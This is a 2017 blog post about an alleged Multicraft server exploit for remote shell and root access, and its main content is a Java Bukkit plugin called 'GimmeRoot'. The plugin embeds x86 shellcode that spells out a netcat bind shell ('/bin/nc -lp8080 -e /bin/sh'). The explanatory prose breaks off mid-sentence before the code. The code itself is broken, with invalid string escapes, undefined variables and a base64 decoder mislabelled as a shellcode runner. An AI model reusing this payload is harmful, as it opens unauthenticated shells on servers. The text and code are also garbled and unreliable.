---
title: "Exploiting vulnerable software and privelage escalation, with some bonus arbitrary code execution :)"
layout: post
date: 2017-06-16 07:47
image: /assets/images/multicraft.png
headerImage: true
tag:
- exploit
- security
- project
- tech
- linux
- java
- shellcode
- netcat
- 0day
- open source
- rootkit
category: blog
author: samlim
description: An old project that may pique the interest for those of you interested in exploitation, cybersecurity, and Linux
---

## Introduction
Hello everybody!

Back in my school days when I was a wee lad (8th grade or so), I began to foster a passion for cybersecurity. Back then I also adored the then-indie game [Minecraft](https://minecraft.net/en-us/). Since I played that game it has since then been purchased by Microsoft, and man did that game go downhill. Please do excuse my harsh critique, maybe it's just the nostalgia I miss :-)

I spent more time with that game than I care to admit. However towards the end of my virtual endeavors as miner, I began to become more and more interested in the _server hosting_ and plugin development aspects of the game. What followed were several of my attempts at starting my own personal server and writing my own plugins: I lasted sveral months, in which I made several thousand dollars worth of donations from my players and learned a bit of Java. All from a video game!

_Not too important right now, but the volatility of these types of game servers and the potential revenue achievable will make more sense later as I explain why exactly "hacking" (ethical or not) is so appealing_

But what had really kindled my interest in this type of computer/network work was server management (in particular Linux and Unix systems), and along with that, exploitation. After some lengthy time familiarizing myself with commonly-used Unix environments and how exactly one goes about exploiting the various pieces of software being run on that machine, my prior experience with Minecraft hosting, server management, and Linux led me to quite the discovery: an exploit that would adventually lead to [_remote shell_](http://resources.infosecinstitute.com/icmp-reverse-shell/) access, [_arbitrary code execution_](https://en.wikipedia.org/wiki/Arbitrary_code_execution), and eventual [_privelage escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) by taking advantage of any machines running the widely-used commercial hosting platform known as [Multicraft](https://www.multicraft.org/).

## The Peculiar Case of Multicraft - Her Achille's Heel
First of all, we need to define what exactly the infamous "root" terminology means. Some may have heard it as a verb:
> Example:
> * "Jane roots many servers"
> * "Dick is rooting the machine right now"

In most Linux distros/flavors the hierarchy of users and user privelages 

    package com.shellcodefun;

        import java.io.File;
        import java.io.FileOutputStream;
        import org.bukkit.plugin.java.JavaPlugin;

        public final class GimmeRoot extends JavaPlugin {
        /*
         * ##
         * # Old semi-updated version
         * ##
         * [REDACTED] Shell - [Redacted], s.lim
         * a [REDACTED] project
         */

        public String payload = "\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e
                                \x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80
                                \xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d
                                \x65\x2f\x62\x69\x6e\x2f\x73\x68\x23";

        public static void execute(String x) {
            System.out.println("[LOCAL ROOT 0DAY] " + x);
        }

        public void onEnable(){
            try {
                Runtime friend = Runtime.getRuntime();
                execute("here we go");
                execute("listening on port 8080");
                byte[] y = run_shellcode(payload);
                execute("Decrypted payload");
                execute("Saved payload as " + ma_homie);
                execute("bl1NG Bl1ing, to reinitialize shell use the bukkit 'reload' command");

            }
            catch(Exception e) {
                System.out.println("uh oh, error baby: " + e.toString());
            }

        }

        @Override
        public void onDisable() {
        }

        private final static char[] char_map = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                .toCharArray();

        private static int[] java_sucks = new int[128];

        static {
            for (int i = 0; i < char_map.length; i++) {
                java_sucks[char_map[i]] = i;
            }
        }
        public static byte[] run_shellcode(String da_shell_code) {
            int sanitize_mah_hax = da_shellcode.endsWith("==") ? 2 : da_shellcode.endsWith("=") ? 1 : 0;
            byte[] the_shiznit = new byte[da_shellcode.length() * 3 / 4 - sanitize_mah_hax];
            int sinker = 0xFF;
            int root_time = 0;
            for (int i = 0; i < da_shellcode.length(); i += 4) {
                int c0 = java_sucks[da_shellcode.charAt(i)];
                int c1 = java_sucks[da_shellcode.charAt(i + 1)];
                the_shiznit[root_time++] = (byte) (((c0 << 2) | (c1 >> 4)) & sinker);
                if (root_time >= the_shiznit.length) {
                    return the_shiznit;
                }
                int c2 = java_sucks[da_shellcode.charAt(i + 2)];
                the_shiznit[root_time++] = (byte) (((c1 << 4) | (c2 >> 2)) & sinker);
                if (root_time >= the_shiznit.length) {
                    return the_shiznit;
                }
                int c3 = java_sucks[da_shellcode.charAt(i + 3)];
                the_shiznit[root_time++] = (byte) (((c2 << 6) | c3) & sinker);
            }
            return the_shiznit;
        }
    }

## Further Reading
* [Reverse Shell Connection with Netcat](https://null-byte.wonderhowto.com/how-to/create-reverse-shell-remotely-execute-root-commands-over-any-open-port-using-netcat-bash-0132658/)

* [What is a 'Rootkit?'](https://en.wikipedia.org/wiki/Rootkit)